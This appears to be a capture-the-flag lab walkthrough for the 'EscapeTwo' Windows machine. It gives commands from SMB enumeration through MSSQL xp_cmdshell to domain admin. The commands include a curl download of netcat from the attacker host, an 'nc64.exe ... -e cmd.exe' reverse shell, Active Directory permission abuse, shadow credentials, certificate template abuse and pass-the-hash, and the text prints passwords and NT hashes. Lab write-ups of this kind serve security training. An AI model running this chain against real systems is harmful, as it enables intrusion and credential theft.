VPN 10.10.11.51Machine InformationAs is common in real life Windows pentests, you will start this box withcredentials for the following account: rose / KxEPkKe6R8su1\. INFO: add it to /etc/hosts fileRUN: **sudo nano /etc/hosts**2\. INFO: Nmap. RUN NMAP 2 times in a row to get ALL PORTS or USEALTERNATIVE SCAN COMMAND!RUN: **sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txtescapetwo.htb**ALTERNATIVE: **sudo nmap -Pn -p- \--min-rate 5000 \--max-rate 10000 -T4-sC -sV -oN nmap-aggressive.txt escapetwo.htb**![](images/media/image1.png){width="4.981042213473316in"height="4.962369860017498in"}3\. INFO: Get infos on HOSTS, SERVICES, SHARESINFO: account: rose / KxEPkKe6R8suRUN: **crackmapexec smb escapetwo.htb -u \"rose\" -p \"KxEPkKe6R8su\"\--rid-brute \| grep SidTypeUser**![](images/media/image2.png){width="6.227487970253718in"height="1.222840113735783in"}3.1 INFO: add DC01 to hosts fileRUN: **sudo nano /ets/hosts**![](images/media/image3.png){width="3.7061614173228348in"height="2.8889260717410323in"}4\. INFO: Try SMB first. SMB file leak! USE HYH ALTERNATIVE!!HYH ALTERNATIVE: **smbclient -L //10.10.11.51 -U rose**![](images/media/image4.png){width="5.679601924759405in"height="2.0426541994750655in"}4.1 INFO: Download accounting_2024.xlsx accounts.xlsx to KALI VM. Openfiles with LibreOFFICE or gnumeric in LINUXLogged in smb: \\\> RUN: **get accounting_2024.xlsx** (ALTERNATIVECOMMAND =\> see CN-SEC.COM solution)Logged in smb: \\\> RUN: **get accounts.xlsx** (ALTERNATIVE COMMAND =\>see CN-SEC.COM solution)RESULT: FOUND USER:PASSWORD =\> sa:MSSQLP@ssw0rd!![](images/media/image5.png){width="6.298611111111111in"height="1.113888888888889in"}Open xlsx-files with LibreOffice Calc or Gnumeric![](images/media/image6.png){width="4.402843394575678in"height="0.9482895888013998in"}4.2 WORKAROUND for xlsx-filesINFO: Check accounts.xlsx for filetypeRUN: **file accounts.xlsx RESULT: It\'s a ZIP file**NEXT: Extract sharedStrings.xml from accounts.xlsx and open it look forSA-USER and his PASSWORD![](images/media/image7.png){width="6.284027777777778in"height="1.6020833333333333in"}**FOOTHOLD**5.1 INFO: successfully login into mssql serviceRUN WORKED: **impacket-mssqlclientescapetwo.htb/sa:MSSQLP\\@ssw0rd\\!\\@10.10.11.51**![](images/media/image8.png){width="6.29375in"height="2.2083333333333335in"}**Sa**= System Administrator, **dbo**= Schema, **master**= CurrentDatabase context is master system database5.2 INFO: Check USERRUN: **xp_cmdshell whoami**![](images/media/image9.png){width="7.008729221347331in"height="0.4597156605424322in"}5.3 INFO:RUN: **enable_xp_cmdshell**![](images/media/image10.png){width="5.781990376202975in"height="0.4130905511811024in"}5.4 INFO: Check USER AGAINRUN: **xp_cmdshell whoami**![](images/media/image11.png){width="2.289099956255468in"height="0.8428215223097113in"}5.5 INFO: Download NETCAT for Windows https://github.com/int0x33/nc.exe/INFO: Upload it and get REVERSE SHELL. IMPORTANT: Start http Server onKali VM and RUN command on TARGET MACHINE (SERVER)!RUN on Kali VM: **python3 -m http.server 80**![](images/media/image12.png){width="6.288888888888889in"height="4.4125in"}RUN on SERVER: **xp_cmdshell curl 10.10.14.163/nc64.exe -oC:\\Users\\public\\nc64.exe** (Has to be done fast, otherwise STEP 5.3has to be repeated) 10.10.14.184 is Kali VM IP!5.6 INFO: Start NETCAT on Kali VMRUN on Kali VM: **nc -lvnp 9999**![](images/media/image13.png){width="2.777251749781277in"height="0.645087489063867in"}5.7 INFO: Connects from Server to Kali VM.RUN on SERVER: **xp_cmdshell C:\\Users\\public\\nc64.exe 10.10.14.1639999 -e cmd.exe**![](images/media/image14.png){width="6.29375in"height="1.7722222222222221in"}**GET USER**6\. INFO: Found another PASSWORD in **sql-Configuration.INI**, in folder**C:\\SQL2019\\ExpressAdv_ENU**7\. INFO: Switch STEP BY STEP through the directoriesRUN on SERVER: **cd C:\\**RUN on SERVER: **dir**RUN on SERVER: **cd SQL2019**RUN on SERVER: **dir**RUN on SERVER: **cd ExpressAdv_ENU**RUN on SERVER: **dir**![](images/media/image15.png){width="3.568720472440945in"height="4.727185039370079in"}7.1 INFO: Display file contentRUN on SERVER: **type sql-Configuration.INI** (displays the file in cmdterminal)![](images/media/image16.png){width="3.497630139982502in"height="2.7524081364829396in"}7.2 INFO: Search for USERS in directory of the SERVER and try thePASSWORD from STEP 7.1 to login with![](images/media/image17.png){width="4.346277340332459in"height="4.199051837270341in"}7.3 INFO: POWERSHELL remote loginRUN: evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3RUN: cd ../DesktopRUN: type user.txtHYHSOLUTION-///-PRIVILEGE_ESCALATION-//////////////////////////////////////////////////////8\. INFO: Add sequel.htb and dc01.sequel.htb to /etc/hostsRUN on SERVER: ipconfig -all8.1 INFO: DOWNLOAD JSON files (ACTIVE DIRECTORY SERVER ENVIRONMENT)RUN on Kali VM: bloodhound-python -u ryan -p \"WqSZAF6CysDQbGb3\" -dsequel.htb -ns 10.10.11.51 -c All8.2 INFO: Start DATABASE on Kali VMRUN on Kali VM: sudo neo4j console8.3 INFO: Start Bloodhound GUI and DRAG & DROP all JSON-filesStart Bloodhound: Login with credentials (previously configured, seeSTEPS in CERTIFIED VM) User: neo4j Password: as1634528.4 INFO: View rights of USER: Ryan. He has WRITE OWNER permission onUSER: CA_SVC. CA_SVC is certificate issuer8.5 INFO: CA_SVC is certificate issuer, so set owner of CA_SVC to RyanRUN on Kali VM: bloodyAD \--host \'10.10.11.51\' -d \'escapetwo.htb\' -u\'ryan\' -p \'WqSZAF6CysDQbGb3\' set owner \'ca_svc\' \'ryan\'8.6 INFO: Get Control rights. SOURCE:https://www.thehacker.recipes/ad/movement/dacl/grant-rightsIMPORTANT: IF THE FOLLOWING COMMAND IS NOT WORKING = ERROR: \[-\] Couldnot modify object, the server reports insufficient rights: 00000005:SecErr: DSID-03152E13, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0=\>\>, repeat STEP 8.5 and RERUN impacket-dacledit command !RUN: impacket-dacledit -action \'write\' -rights \'FullControl\'-principal \'ryan\' -target \'ca_svc\'\'sequel.htb\'/\"ryan\":\"WqSZAF6CysDQbGb3\"9\. INFO: ESC4 to ESC1. SOURCE:https://book.hacktricks.xyz/kr/windows-hardening/active-directory-methodology/ad-certificates/domain-persistence?fallback=trueINFO: Obtain SHADOW CREDENTIALS and NTHash.IMPORTANT: If ERROR occurs: \[-\] Could not update Key Credentials for\'ca_svc\' due to insufficient access rights: 00002098: SecErr:DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0. NEXT: REPEATSTEPS 8.5 & 8.6RUN: certipy-ad shadow auto -u \'ryan@sequel.htb\' -p\"WqSZAF6CysDQbGb3\" -account \'ca_svc\' -dc-ip \'10.10.11.51\'GOT NTHASH: \[\*\] NT hash for \'ca_svc\':3b181b914e7a9d5508ea1e20bc2b7fce10\. INFO: Download Certify.exe from GITHUBhttps://github.com/ademkanat/Certify/blob/main/Certify.exeFind a usable template, it\'s settings have to be overridden.Use Certify.exe to upload to the target machineRUN on Kali VM: evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3INFO: Upload Certify.exe to SERVERRUN on SERVER: impacket-mssqlclientescapetwo.htb/sa:MSSQLP\\@ssw0rd\\!\\@10.10.11.51RUN on SERVER: enable_xp_cmdshellRUN LOGGEDIN on POWERSHELL, on SERVER: mkdir C:\\tempRUN on SERVER: xp_cmdshell curl 10.10.14.184/Certify.exe -oC:\\Users\\public\\Certify.exe (Uploads Certify.exe to SERVER)RUN LOGGEDIN on POWERSHELL, on SERVER: C:\\temp\> ./Certify.exe find/domain:sequel.htb10\. 2nd INFO: Change directoryRUN: cd C:\\temp12\. INFO: Run Certify.exe. You can see that ca_svc has overridablepermissions for this certificate ðŸ‘†, so let\'s overwrite it. (IN NEXTSTEP)RUN: .\\Certify.exe find /domain:sequel.htb13\. INFO: Override itRUN on Kali VM: KRB5CCNAME=\$PWD/ca_svc.ccache certipy-ad template -k-template DunderMifflinAuthentication -dc-ip 10.10.11.51 -targetdc01.sequel.htb14\. INFO: CERTIPY. Using ca_svc the user\'s credential hash, a Kerberosrequest is made to obtain an authentication ticket to the target system.IMPORTANT: Paste HASH 3b181b914e7a9d5508ea1e20bc2b7fce from STEP 9THIS DID NOT WORK !!!!!! =\>\>RUN on Kali VM: certipy-ad req -u ca_svc -hashes\'3b181b914e7a9d5508ea1e20bc2b7fce\' -ca sequel-DC01-CA -targetsequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upnadministrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug15\. INFO: Get the Administrator\'s hash through the certificateRUN on Kali VM: certipy-ad auth -pfx administrator_10.pfx -domainsequel.htb15.2 INFO: POWERSHELL login as ADMINISTRATOR and get USER.TXTIMPORTANT: Paste HASH you got in STEP 15RUN on KALI: evil-winrm -i 10.10.11.51 -u \"administrator\" -H\"7a8d4e04986afa8ed4060f75e5a0b3ff\"RUN on SERVER: cd ../DesktopRUN on SERVER: type root.txt